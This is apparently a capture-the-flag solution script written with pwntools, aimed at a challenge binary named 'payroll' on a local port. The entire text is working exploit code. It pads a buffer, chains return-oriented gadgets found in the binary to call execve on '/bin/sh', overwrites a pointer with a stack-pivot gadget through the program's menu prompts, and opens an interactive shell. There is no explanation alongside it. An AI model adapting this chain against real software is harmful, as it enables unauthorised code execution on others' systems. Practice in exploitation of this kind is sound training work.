from pwn import *

PROGNAME   = "chal/payroll"
REMOTEIP   = "127.0.0.1"
REMOTEPORT = 19200

if args.REMOTE:
    p = remote(REMOTEIP, REMOTEPORT)
    elf = ELF(PROGNAME)
else:
    p = process(PROGNAME)
    elf = p.elf

gadget = lambda x : p32(elf.search(asm(x, arch=elf.arch)).next())


popeax = gadget("pop eax; add al, 8; add ecx, ecx; ret")
popebx = gadget("pop ebx; ret;");
xorecxedx = gadget("xor ecx, ecx; xor edx, edx; ret")

payload = cyclic(12)
payload += popeax + p32(constants.SYS_execve - 8)
payload += xorecxedx
payload += popebx + p32(elf.search("/bin/sh").next())
payload += gadget("int 0x80")

p.sendlineafter(":", payload)

for i in range(0x41, 0x48):
    p.sendlineafter("): ", "a")
    p.sendlineafter(": ", chr(i)*4)
    p.sendlineafter(": ", chr(i + 1)*4)


stack_pivot = gadget("add esp, 8; pop ebx; ret")

p.sendlineafter("): ", "a")
p.sendlineafter(": ", 'AAAA')
p.sendlineafter(": ", stack_pivot)


p.sendlineafter(":", "q")

p.interactive()

